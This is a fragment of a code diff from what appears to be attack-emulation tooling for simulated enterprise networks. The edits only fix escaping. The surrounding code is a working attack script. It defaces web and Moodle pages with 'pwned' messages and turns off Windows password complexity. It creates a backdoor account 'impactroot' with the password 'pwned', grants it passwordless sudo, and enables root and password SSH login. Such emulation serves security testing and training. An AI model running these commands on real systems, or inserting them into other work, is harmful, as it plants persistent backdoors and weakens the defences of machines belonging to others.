@@ -178,7 +178,7 @@ echo "[impact_integrity] complete"
 # Modify secure page and moodle
 for path in /var/www/html/service.*; do
   sudo sed -i 's|This is an example paragraph for a secure directory.*|<p>This site has been modified. You may have been pwned. [integrity tag]</p>|' "$path/secure/index.html"
-  sudo -u www-data php "$path/moodle/admin/tool/replace/cli/replace.php" \
+  sudo -u www-data php "$path/moodle/admin/tool/replace/cli/replace.php" \\
           --search='Moody' --replace='Pwned' --non-interactive
 done
 
@@ -343,7 +343,7 @@ def impact_confidentiality(node: dict, enterprise: dict) -> dict:
         if 'windows' in node_desc['roles']:
             cmd = (
                 "secedit /export /cfg secconfig.cfg;"
-                "(Get-Content secconfig.cfg) -replace 'PasswordComplexity\s*=\s*1', 'PasswordComplexity = 0' |"
+                "(Get-Content secconfig.cfg) -replace 'PasswordComplexity\\s*=\\s*1', 'PasswordComplexity = 0' |"
                 "    Set-Content secconfig-mod.cfg;"
                 "secedit /configure /db secedit.sdb /cfg secconfig-mod.cfg /areas SECURITYPOLICY;"
                 "Remove-Item secconfig.cfg, secconfig-mod.cfg, secedit.sdb;"
@@ -372,9 +372,9 @@ if ! id impactroot &>/dev/null; then
 fi
 echo 'impactroot:pwned' | sudo chpasswd --crypt-method=SHA512
 sudo usermod -aG sudo impactroot
-sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-sudo sed -i 's/^#\?KbdInteractiveAuthentication.*/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config
+sudo sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+sudo sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+sudo sed -i 's/^#\\?KbdInteractiveAuthentication.*/KbdInteractiveAuthentication yes/' /etc/ssh/sshd_config
 echo 'impactroot ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/impactroot
 sudo chmod 440 /etc/sudoers.d/impactroot
 sudo systemctl restart ssh
